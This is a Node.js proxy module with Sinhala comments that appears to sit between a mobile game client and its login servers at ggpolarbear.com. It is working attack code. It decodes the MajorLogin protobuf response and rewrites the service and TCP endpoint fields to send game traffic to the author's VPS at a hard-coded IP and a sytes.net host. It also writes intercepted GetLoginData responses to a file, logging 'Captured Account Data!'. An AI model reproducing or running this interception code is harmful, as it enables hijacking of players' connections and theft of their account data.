const https = require('https');
const protobuf = require('protobufjs');
const fs = require('fs');

const TARGET_HOST = 'loginbp.ggpolarbear.com';
const MY_IP = '103.6.168.170'; // උඹේ VPS IP එක
const TCP_PORT = 7006;

const root = protobuf.Root.fromJSON({
    nested: {
        MajorLoginResponse: {
            fields: {
                field1: { type: "uint64", id: 1 },
                field2: { type: "string", id: 2 },
                field10: { type: "string", id: 10 }, // 👈 මේක තමයි Client Service එක
                field16: { type: "string", id: 16 }, // 👈 මේක TCP එක
                field19: { type: "string", id: 19 },
                field24: { type: "string", id: 24 }
            }
        }
    }
});
const LoginResponseMsg = root.lookupType("MajorLoginResponse");

module.exports = function(app) {
    app.all(/.*/, (req, res) => {
        if (req.url.includes('/ver.php')) return;

        console.log(`🔍 [INCOMING] ${req.method} ${req.url}`);

        // ගේම් එක redirect වුණාම අපේ සර්වර් එකටම එන requests handle කරන්න
        let host = TARGET_HOST;
        if (req.url.includes('Account') || req.url.includes('GetLoginData')) {
            host = 'clientbp.ggpolarbear.com';
        }

        const options = {
            hostname: host, port: 443, path: req.url, method: req.method,
            headers: { ...req.headers, 'host': host }
        };

        const proxyReq = https.request(options, (proxyRes) => {
            let resChunks = [];
            proxyRes.on('data', chunk => resChunks.push(chunk));
            proxyRes.on('end', () => {
                let buffer = Buffer.concat(resChunks);

                // 🎯 මෙතනදී අපි MajorLogin එක බලෙන් අපේ VPS එකට හරවනවා
                if (req.url.includes('/MajorLogin')) {
                    try {
                        const decoded = LoginResponseMsg.decode(buffer);
                        
                        // 1. ඊළඟට එන GetLoginData රික්වෙස්ට් එක අපේ VPS එකට එවන්න කියනවා
                        decoded.field10 = `https://navivpn.sytes.net`; 
                        
                        // 2. TCP කනෙක්ෂන් එකත් අපේ එකට හරවනවා
                        decoded.field16 = `${MY_IP}:${TCP_PORT}`;
                        decoded.field24 = `${MY_IP}:${TCP_PORT}`;
                        decoded.field19 = MY_IP;

                        buffer = LoginResponseMsg.encode(LoginResponseMsg.create(decoded)).finish();
                        console.log(`🚀 [REDIRECTED] Redirecting Game Traffic to VPS!`);
                    } catch (e) {
                        console.log(`❌ Error: ${e.message}`);
                    }
                }

                // 📦 GetLoginData එක අහු වුණොත් සේව් කරමු
                if (req.url.includes('GetLoginData')) {
                    console.log(`✅ [SUCCESS] Captured Account Data!`);
                    fs.writeFileSync('captured_account_data.bin', buffer);
                }

                Object.keys(proxyRes.headers).forEach(k => res.setHeader(k, proxyRes.headers[k]));
                res.status(proxyRes.statusCode).send(buffer);
            });
        });

        proxyReq.on('error', (e) => res.status(500).send(""));
        if (req.rawBody) proxyReq.write(req.rawBody);
        proxyReq.end();
    });
};
